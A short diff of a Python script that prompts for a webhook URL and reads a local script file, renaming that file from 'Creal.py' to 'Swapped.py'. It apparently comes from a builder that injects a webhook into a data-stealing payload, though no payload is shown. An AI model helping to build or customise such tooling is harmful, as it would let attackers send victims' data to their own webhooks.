@@ -53,7 +53,7 @@ while True:
         os.system("cls || clear")
         webhook = input(Fore.CYAN + "\nEnter Your Webhook: " + Style.RESET_ALL)
 
-        filename = "Creal.py"
+        filename = "Swapped.py"
         filepath = os.path.join(os.getcwd(), filename)
         with open(filepath, "r", encoding="utf-8") as f:
             content = f.read()
